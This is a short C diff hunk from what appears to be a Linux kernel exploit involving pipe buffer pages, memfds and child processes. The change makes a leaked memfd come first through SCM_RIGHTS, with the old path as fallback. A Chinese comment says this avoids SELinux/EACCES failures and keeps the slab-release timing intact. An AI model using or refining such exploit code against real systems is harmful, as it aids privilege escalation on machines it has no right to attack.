@@ -147,7 +147,10 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     post.childs[i] = -1;
     post.memfds[i] = clone_memfd();
   }
-  int leak_memfd = open_memfd(leak_child);
+  /* mt47-c: SCM_RIGHTS 自开 pin 优先(出生即 pin, 无 SELinux/EACCES 依赖),
+   * 失败回退旧路径。close 位置不变(pipe 下方) → slab 释放波时序不变。 */
+  int leak_memfd = leak_memfd_recv();
+  if (leak_memfd < 0) leak_memfd = open_memfd(leak_child);
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     kill_child(pre.childs[i]);
